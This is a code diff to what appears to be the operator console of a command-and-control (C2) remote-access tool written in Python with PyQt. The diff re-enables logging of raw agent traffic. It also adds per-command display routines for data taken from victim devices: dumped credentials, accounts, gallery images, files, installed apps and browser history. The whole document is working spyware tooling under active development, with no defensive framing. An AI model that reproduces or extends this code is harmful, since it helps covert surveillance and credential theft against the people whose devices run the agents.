@@ -266,7 +266,7 @@ class C2Server(QThread):
 
     def process_agent_data(self, sock: socket.socket, data: str):
         """Process incoming data from agent - BYPASS BEACON"""
-        # self.log_message.emit(f"📥 Raw data ({len(data)} bytes)")  # REDUCED NOISE
+        self.log_message.emit(f"📥 Raw data ({len(data)} bytes)")
         
         agent_id = None
         
@@ -315,7 +315,7 @@ class C2Server(QThread):
         """Handle raw connection tanpa beacon - TAHAN KONEKSI"""
         agent_id = f"agent_{int(time.time())}"
         
-        # self.log_message.emit(f"📥 Raw data from new connection: {data[:50]}...")  # REDUCED NOISE
+        self.log_message.emit(f"📥 Raw data from new connection: {data[:50]}...")
         
         device = "Raw Connection"
         try:
@@ -463,7 +463,7 @@ class C2Server(QThread):
             elif msg.get("command") or msg.get("result"):
                 self.command_response.emit(msg)
             else:
-                pass  # REDUCED NOISE: self.log_message.emit(f"📨 Unknown message: {line[:100]}...")
+                self.log_message.emit(f"📨 Unknown message: {line[:100]}...")
 
         except json.JSONDecodeError:
             if ":" in line and len(line) < 200:
@@ -475,7 +475,7 @@ class C2Server(QThread):
                         "result": parts[1].strip()
                     })
             else:
-                pass  # REDUCED NOISE: self.log_message.emit(f"📨 Raw: {line[:100]}...")
+                self.log_message.emit(f"📨 Raw: {line[:100]}...")
 
     def remove_agent(self, sock: socket.socket):
         with self.agent_lock:
@@ -1578,7 +1578,7 @@ class MainWindow(QMainWindow):
             elif result.get('status') == 'unknown':
                 self.add_output(f"❌ Unknown command: {command}. Type HELP for available commands", "warning")
             else:
-                self.add_output(f"📥 {command}: {str(result)[:50000]}...", "cyan")
+                pass  # Data akan di-routing ke tab spesifik
         
         # ✅ ROUTING KE TAB
         if isinstance(result, (dict, list)):
@@ -1692,31 +1692,40 @@ class MainWindow(QMainWindow):
                 )
         
         
-        # ---------- 9. SIMPLE TABS: Apps, Files, Browser, Gallery, Accounts, Credentials ----------
+        # ================================================================
+        # ✅ SIMPLE TABS HANDLER - Apps, Files, Browser, Gallery, Accounts, Credentials
+        # ================================================================
+        
         simple_commands = {
-            "GET_INSTALLED_APPS": "Apps",
-            "GET_FILES_LIST": "Files",
-            "BROWSER_INFO": "Browser",
-            "GET_GALLERY": "Gallery",
-            "GET_ACCOUNTS": "Accounts",
-            "DUMP_CREDENTIALS": "Credentials"
+            "GET_INSTALLED_APPS": ("Apps_text", "_format_app_list"),
+            "GET_FILES_LIST": ("Files_text", "_format_file_list"),
+            "BROWSER_INFO": ("Browser_text", "_format_browser_list"),
+            "GET_GALLERY": ("Gallery_text", "_format_gallery_list"),
+            "GET_ACCOUNTS": ("Accounts_text", "_format_accounts_list"),
+            "DUMP_CREDENTIALS": ("Credentials_text", "_format_credentials_list")
         }
         
         if command in simple_commands:
-            tab_key = simple_commands[command]
-            attr_name = f"{tab_key}_text"
-            
-            if hasattr(self, attr_name):
-                text_widget = getattr(self, attr_name)
-                if isinstance(result, dict):
-                    data = result.get('data', [])
-                    formatted = self._format_data_table(data, command)
-                    text_widget.clear()
-                    text_widget.append(formatted)
-                    text_widget.verticalScrollBar().setValue(
-                        text_widget.verticalScrollBar().maximum()
-                    )
-        
+            tab_attr, formatter_method = simple_commands[command]
+            if hasattr(self, tab_attr) and isinstance(result, dict):
+                text_widget = getattr(self, tab_attr)
+                data = result.get('data', [])
+                
+                if data and isinstance(data, list):
+                    formatter = getattr(self, formatter_method, None)
+                    if formatter:
+                        formatted = formatter(data, result)
+                    else:
+                        formatted = json.dumps(data, indent=2, ensure_ascii=False)[:3000]
+                else:
+                    formatted = "No data available"
+                
+                text_widget.clear()
+                text_widget.append(formatted)
+                text_widget.verticalScrollBar().setValue(
+                    text_widget.verticalScrollBar().maximum()
+                )
+
         # ---------- 6. CONTACTS ----------
         elif command == "GET_CONTACTS" and hasattr(self, "Contacts_text"):
             if isinstance(result, dict):
@@ -2277,105 +2286,81 @@ class MainWindow(QMainWindow):
         self.cmd_input.setText(cmd)
         self.cmd_input.setFocus()
 
-    def _format_data_table(self, data, command):
-        """Format list data menjadi table yang rapi"""
-        if not isinstance(data, list) or len(data) == 0:
-            return "No data available"
-        
-        # GET_INSTALLED_APPS
-        if command == "GET_INSTALLED_APPS":
-            formatted = f"📱 INSTALLED APPS ({len(data)})\n"
-            formatted += "━" * 70 + "\n\n"
-            for i, app in enumerate(data, 1):
-                name = app.get('name', 'Unknown')
-                pkg = app.get('package', 'N/A')
-                version = app.get('version', 'N/A')
-                formatted += f"{i:2}. {name}\n"
-                formatted += f"     📦 {pkg}\n"
-                if version != 'N/A':
-                    formatted += f"     v{version}\n"
-                formatted += "\n"
-            return formatted
-        
-        # GET_FILES_LIST
-        elif command == "GET_FILES_LIST":
-            formatted = f"📁 FILES ({len(data)})\n"
-            formatted += "━" * 70 + "\n\n"
-            for i, f in enumerate(data, 1):
-                path = f.get('path', 'N/A')
-                size = f.get('size', 0)
-                ftype = f.get('type', 'file')
-                icon = "📂" if ftype == 'dir' else "📄"
-                formatted += f"{i:2}. {icon} {path}\n"
-                formatted += f"     💾 {size:,} bytes\n\n"
-            return formatted
-        
-        # BROWSER_INFO
-        elif command == "BROWSER_INFO":
-            formatted = f"🌐 BROWSER HISTORY ({len(data)})\n"
-            formatted += "━" * 70 + "\n\n"
-            for i, b in enumerate(data, 1):
-                url = b.get('url', 'N/A')[:60]
-                title = b.get('title', 'N/A')[:50]
-                timestamp = b.get('timestamp', 'N/A')
-                formatted += f"{i:2}. {title}\n"
-                formatted += f"     🔗 {url}\n"
-                formatted += f"     ⏰ {timestamp}\n\n"
-            return formatted
-        
-        # GET_GALLERY
-        elif command == "GET_GALLERY":
-            formatted = f"🖼️ GALLERY ({len(data)})\n"
-            formatted += "━" * 70 + "\n\n"
-            for i, img in enumerate(data, 1):
-                path = img.get('path', 'N/A')
-                size = img.get('size', 0)
-                width = img.get('width', 'N/A')
-                height = img.get('height', 'N/A')
-                formatted += f"{i:2}. {path}\n"
-                formatted += f"     💾 {size:,} bytes | {width}x{height}px\n\n"
-            return formatted
-        
-        # GET_ACCOUNTS
-        elif command == "GET_ACCOUNTS":
-            formatted = f"🔐 ACCOUNTS ({len(data)})\n"
-            formatted += "━" * 70 + "\n\n"
-            for i, acc in enumerate(data, 1):
-                name = acc.get('name', 'Unknown')
-                atype = acc.get('type', 'N/A')
-                user = acc.get('user', acc.get('email', 'N/A'))
-                formatted += f"{i:2}. {name}\n"
-                formatted += f"     🏷️ {atype}\n"
-                formatted += f"     👤 {user}\n\n"
-            return formatted
-        
-        # DUMP_CREDENTIALS
-        elif command == "DUMP_CREDENTIALS":
-            formatted = f"🔑 CREDENTIALS ({len(data)})\n"
-            formatted += "━" * 70 + "\n\n"
-            for i, cred in enumerate(data, 1):
-                service = cred.get('service', 'Unknown')
-                username = cred.get('username', 'N/A')
-                password = cred.get('password', '***')
-                formatted += f"{i:2}. {service}\n"
-                formatted += f"     👤 {username}\n"
-                if password and password != 'N/A':
-                    formatted += f"     🔐 {'*' * len(password)}\n"
-                formatted += "\n"
-            return formatted
-        
-        # DEFAULT
-        else:
-            return json.dumps(data, indent=2, ensure_ascii=False)[:3000]
 
-    def _format_json_pretty(self, data, indent=2):
-        """Format any data sebagai JSON rapi"""
-        try:
-            if isinstance(data, (dict, list)):
-                return json.dumps(data, indent=indent, ensure_ascii=False)
-            return str(data)
-        except:
-            return str(data)[:1000]
+    def _format_app_list(self, data, result):
+        """Format installed apps list"""
+        count = result.get('count', len(data))
+        formatted = f"📱 INSTALLED APPS ({count})\n"
+        formatted += "━" * 70 + "\n\n"
+        for i, app in enumerate(data[:100], 1):  # Max 100
+            name = app.get('name', 'Unknown')[:40]
+            pkg = app.get('package', 'N/A')[:60]
+            formatted += f"{i:2}. {name}\n"
+            formatted += f"     📦 {pkg}\n\n"
+        return formatted
+
+    def _format_file_list(self, data, result):
+        """Format files list"""
+        count = result.get('count', len(data))
+        formatted = f"📁 FILES ({count})\n"
+        formatted += "━" * 70 + "\n\n"
+        for i, f in enumerate(data[:100], 1):
+            path = f.get('path', 'N/A')[:50]
+            size = f.get('size', 0)
+            ftype = f.get('type', 'file')
+            icon = "📂" if ftype == 'dir' else "📄"
+            formatted += f"{i:2}. {icon} {path}\n"
+            formatted += f"     💾 {size:,} bytes\n\n"
+        return formatted
+
+    def _format_browser_list(self, data, result):
+        """Format browser history"""
+        count = result.get('count', len(data))
+        formatted = f"🌐 BROWSER ({count})\n"
+        formatted += "━" * 70 + "\n\n"
+        for i, b in enumerate(data[:100], 1):
+            title = b.get('title', 'N/A')[:40]
+            url = b.get('url', 'N/A')[:50]
+            formatted += f"{i:2}. {title}\n"
+            formatted += f"     🔗 {url}\n\n"
+        return formatted
+
+    def _format_gallery_list(self, data, result):
+        """Format gallery images"""
+        count = result.get('count', len(data))
+        formatted = f"🖼️ GALLERY ({count})\n"
+        formatted += "━" * 70 + "\n\n"
+        for i, img in enumerate(data[:100], 1):
+            path = img.get('path', 'N/A')[:50]
+            size = img.get('size', 0)
+            formatted += f"{i:2}. {path}\n"
+            formatted += f"     💾 {size:,} bytes\n\n"
+        return formatted
+
+    def _format_accounts_list(self, data, result):
+        """Format accounts"""
+        count = result.get('count', len(data))
+        formatted = f"🔐 ACCOUNTS ({count})\n"
+        formatted += "━" * 70 + "\n\n"
+        for i, acc in enumerate(data[:100], 1):
+            name = acc.get('name', 'Unknown')[:40]
+            atype = acc.get('type', 'N/A')[:30]
+            formatted += f"{i:2}. {name}\n"
+            formatted += f"     🏷️ {atype}\n\n"
+        return formatted
+
+    def _format_credentials_list(self, data, result):
+        """Format credentials"""
+        count = result.get('count', len(data))
+        formatted = f"🔑 CREDENTIALS ({count})\n"
+        formatted += "━" * 70 + "\n\n"
+        for i, cred in enumerate(data[:100], 1):
+            service = cred.get('service', 'Unknown')[:40]
+            user = cred.get('username', 'N/A')[:40]
+            formatted += f"{i:2}. {service}\n"
+            formatted += f"     👤 {user}\n\n"
+        return formatted
+
 
     def add_output(self, text: str, level: str = "info"):
         timestamp = datetime.now().strftime("%H:%M:%S")
